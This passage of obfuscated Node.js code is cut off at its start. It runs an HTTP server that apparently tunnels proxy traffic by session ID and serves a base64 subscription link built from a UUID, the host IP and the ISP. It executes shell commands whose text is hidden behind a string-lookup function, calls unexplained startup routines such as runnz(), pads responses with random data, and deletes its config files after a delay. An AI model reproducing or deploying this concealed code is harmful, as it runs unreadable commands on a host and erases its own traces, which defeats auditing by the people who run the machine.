_0x2611ba=_0x57fced;return!_0x58d881['headersSent']&&_0x58d881[_0x2611ba(0x123)](0xc8,_0x1fbc18),this[_0x2611ba(0x1c0)]=_0x58d881,this[_0x2611ba(0x1dc)]&&this['responseHeader']&&this[_0x2611ba(0x1b9)](),_0x58d881['on'](_0x2611ba(0x12a),()=>{const _0xd255c2=_0x2611ba;log(_0xd255c2(0x107),'Client\x20connection\x20closed'),this[_0xd255c2(0x139)]();}),!![];}async[_0x57fced(0xfe)](_0x47d1a6){const _0x4a6d63=_0x57fced;if(!this[_0x4a6d63(0x17c)]||this['remote'][_0x4a6d63(0x1d9)])throw new Error(_0x4a6d63(0x166));return new Promise((_0x321527,_0x18ef0c)=>{const _0x23a467=_0x4a6d63;this[_0x23a467(0x17c)]['write'](_0x47d1a6,_0x40edf4=>{const _0xd20282=_0x23a467;_0x40edf4?(log(_0xd20282(0x1d6),_0xd20282(0x108)+_0x40edf4[_0xd20282(0x13a)]),_0x18ef0c(_0x40edf4)):_0x321527();});});}[_0x57fced(0x1b9)](){const _0x57db73=_0x57fced;if(!this['currentStreamRes']||!this[_0x57db73(0x1b8)])return;try{!this['headerSent']&&(this[_0x57db73(0x1c0)][_0x57db73(0x1e8)](this[_0x57db73(0x1b8)]),this[_0x57db73(0x1ce)]=!![]),this[_0x57db73(0x17c)][_0x57db73(0x1c5)](this[_0x57db73(0x1c0)]),this[_0x57db73(0x17c)]['on'](_0x57db73(0x16f),()=>{const _0x31aedb=_0x57db73;!this[_0x31aedb(0x1c0)]['writableEnded']&&this[_0x31aedb(0x1c0)][_0x31aedb(0x16f)]();}),this[_0x57db73(0x17c)]['on']('error',_0x4a9945=>{const _0x58460d=_0x57db73;log(_0x58460d(0x1d6),_0x58460d(0x1bb)+_0x4a9945[_0x58460d(0x13a)]),!this[_0x58460d(0x1c0)][_0x58460d(0x1a1)]&&this[_0x58460d(0x1c0)][_0x58460d(0x16f)]();});}catch(_0x5a7ce1){log(_0x57db73(0x1d6),_0x57db73(0x1cc)+_0x5a7ce1['message']),this[_0x57db73(0x139)]();}}[_0x57fced(0x139)](){const _0x2f85ea=_0x57fced;!this[_0x2f85ea(0x19d)]&&(this[_0x2f85ea(0x19d)]=!![],log(_0x2f85ea(0x18d),_0x2f85ea(0x10e)+this['uuid']),this[_0x2f85ea(0x17c)]&&(this['remote'][_0x2f85ea(0x148)](),this[_0x2f85ea(0x17c)]=null),this['initialized']=![],this[_0x2f85ea(0x1ce)]=![]);}}const metaInfo=execSync(_0x57fced(0x129),{'encoding':_0x57fced(0x168)}),ISP=metaInfo[_0x57fced(0x164)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x57fced(0x163),{'encoding':_0x57fced(0x168)})[_0x57fced(0x164)]();}catch(_0x52b91b){try{IP='['+execSync(_0x57fced(0x158),{'encoding':_0x57fced(0x168)})[_0x57fced(0x164)]()+']';}catch(_0x5cb6f5){log(_0x57fced(0x1d6),_0x57fced(0x10d),_0x5cb6f5[_0x57fced(0x13a)]),IP=_0x57fced(0x17e);}}const server=http[_0x57fced(0x1a8)]((_0x442a12,_0x38bbb8)=>{const _0x41d5d4=_0x57fced,_0x959ab2={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':'GET,\x20POST','Cache-Control':_0x41d5d4(0x171),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x442a12[_0x41d5d4(0x167)]==='/'){const _0xa59223=path[_0x41d5d4(0x106)](__dirname,_0x41d5d4(0x1c4));fs[_0x41d5d4(0x132)](_0xa59223,_0x41d5d4(0x18e),(_0x36cb65,_0x589aeb)=>{const _0x37f339=_0x41d5d4;if(_0x36cb65){_0x38bbb8[_0x37f339(0x123)](0x1f4,{'Content-Type':_0x37f339(0x103)}),_0x38bbb8[_0x37f339(0x16f)](_0x37f339(0x1d0));return;}_0x38bbb8[_0x37f339(0x123)](0xc8,{'Content-Type':_0x37f339(0x112)}),_0x38bbb8[_0x37f339(0x16f)](_0x589aeb);});return;}if(_0x442a12[_0x41d5d4(0x167)]==='/'+SUB_PATH){const _0x6fd3=_0x41d5d4(0x14a)+UUID+'@'+IP+_0x41d5d4(0x197)+IP+_0x41d5d4(0x19c)+IP+_0x41d5d4(0x113)+SETTINGS[_0x41d5d4(0x160)]+_0x41d5d4(0x16d)+NAME+'-'+ISP,_0x5d9592=Buffer[_0x41d5d4(0x12f)](_0x6fd3)[_0x41d5d4(0x118)](_0x41d5d4(0x1e4));_0x38bbb8[_0x41d5d4(0x123)](0xc8,{'Content-Type':'text/plain'}),_0x38bbb8[_0x41d5d4(0x16f)](_0x5d9592+'\x0a');return;}const _0x272cbc=_0x442a12[_0x41d5d4(0x167)][_0x41d5d4(0x142)](new RegExp(XPATH+'/([^/]+)(?:/([0-9]+))?$'));if(!_0x272cbc){_0x38bbb8[_0x41d5d4(0x123)](0x194),_0x38bbb8[_0x41d5d4(0x16f)]();return;}const _0x22d164=_0x272cbc[0x1],_0x3fd97d=_0x272cbc[0x2]?parseInt(_0x272cbc[0x2]):null;if(_0x442a12[_0x41d5d4(0x11f)]===_0x41d5d4(0x128)&&!_0x3fd97d){_0x959ab2[_0x41d5d4(0x19f)]=_0x41d5d4(0x170),_0x959ab2[_0x41d5d4(0x14f)]=_0x41d5d4(0x1d8);let _0x5b8428=sessions[_0x41d5d4(0x131)](_0x22d164);!_0x5b8428&&(_0x5b8428=new Session(_0x22d164),sessions[_0x41d5d4(0x111)](_0x22d164,_0x5b8428),log('info',_0x41d5d4(0x1da)+_0x22d164));_0x5b8428[_0x41d5d4(0x156)]=!![];!_0x5b8428['startDownstream'](_0x38bbb8,_0x959ab2)&&(log(_0x41d5d4(0x1d6),_0x41d5d4(0x174)+_0x22d164),!_0x38bbb8['headersSent']&&(_0x38bbb8['writeHead'](0x1f4),_0x38bbb8[_0x41d5d4(0x16f)]()),_0x5b8428[_0x41d5d4(0x139)](),sessions['delete'](_0x22d164));return;}if(_0x442a12['method']===_0x41d5d4(0x190)&&_0x3fd97d!==null){let _0x2040f0=sessions[_0x41d5d4(0x131)](_0x22d164);!_0x2040f0&&(_0x2040f0=new Session(_0x22d164),sessions['set'](_0x22d164,_0x2040f0),log(_0x41d5d4(0x107),_0x41d5d4(0x104)+_0x22d164),setTimeout(()=>{const _0x120bdd=_0x41d5d4,_0x4fa325=sessions[_0x120bdd(0x131)](_0x22d164);_0x4fa325&&!_0x4fa325['downstreamStarted']&&(log('warn',_0x120bdd(0x194)+_0x22d164+_0x120bdd(0x14e)),_0x4fa325[_0x120bdd(0x139)](),sessions[_0x120bdd(0x1a2)](_0x22d164));},SETTINGS[_0x41d5d4(0x13b)]));let _0x580106=[],_0x158a45=0x0,_0x281a61=![];_0x442a12['on'](_0x41d5d4(0x1df),_0x158a8f=>{const _0x308698=_0x41d5d4;_0x158a45+=_0x158a8f[_0x308698(0x14d)];if(_0x158a45>SETTINGS['MAX_POST_SIZE']){!_0x281a61&&(_0x38bbb8[_0x308698(0x123)](0x19d),_0x38bbb8[_0x308698(0x16f)](),_0x281a61=!![]);return;}_0x580106['push'](_0x158a8f);}),_0x442a12['on'](_0x41d5d4(0x16f),async()=>{const _0x4769db=_0x41d5d4;if(_0x281a61)return;try{const _0x45e9e3=Buffer[_0x4769db(0x10c)](_0x580106);log(_0x4769db(0x107),_0x4769db(0x193)+_0x3fd97d+',\x20size='+_0x45e9e3['length']),await _0x2040f0['processPacket'](_0x3fd97d,_0x45e9e3),!_0x281a61&&(_0x38bbb8[_0x4769db(0x123)](0xc8,_0x959ab2),_0x281a61=!![]),_0x38bbb8[_0x4769db(0x16f)]();}catch(_0x304a6d){log(_0x4769db(0x1d6),_0x4769db(0x184)+_0x304a6d[_0x4769db(0x13a)]),_0x2040f0[_0x4769db(0x139)](),sessions[_0x4769db(0x1a2)](_0x22d164),!_0x281a61&&(_0x38bbb8['writeHead'](0x1f4),_0x281a61=!![]),_0x38bbb8[_0x4769db(0x16f)]();}});return;}_0x38bbb8['writeHead'](0x194),_0x38bbb8[_0x41d5d4(0x16f)]();});server['on']('secureConnection',_0x4a6c41=>{const _0x1101b5=_0x57fced;log('debug',_0x1101b5(0x1a6)+(_0x4a6c41[_0x1101b5(0x15f)]||'http/1.1'));});function generatePadding(_0x5d3247,_0x1021f7){const _0x3ff876=_0x57fced,_0x395d30=_0x5d3247+Math[_0x3ff876(0x1aa)](Math['random']()*(_0x1021f7-_0x5d3247));return Buffer['from'](Array(_0x395d30)[_0x3ff876(0x1ab)]('X')[_0x3ff876(0x106)](''))[_0x3ff876(0x118)]('base64');}server[_0x57fced(0x1e1)]=0x975e0,server[_0x57fced(0x1c9)]=0x98968,server['on'](_0x57fced(0x1d6),_0x1d3466=>{const _0x49caaa=_0x57fced;log(_0x49caaa(0x1d6),_0x49caaa(0x124)+_0x1d3466[_0x49caaa(0x13a)]);});const delFiles=()=>{const _0x3d45a3=_0x57fced;[_0x3d45a3(0x11e),'config.yaml'][_0x3d45a3(0x105)](_0x3c1acc=>fs[_0x3d45a3(0x136)](_0x3c1acc,()=>{}));};server[_0x57fced(0x1cb)](PORT,()=>{const _0x32151c=_0x57fced;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x32151c(0x191)](_0x32151c(0x16a)+PORT);});
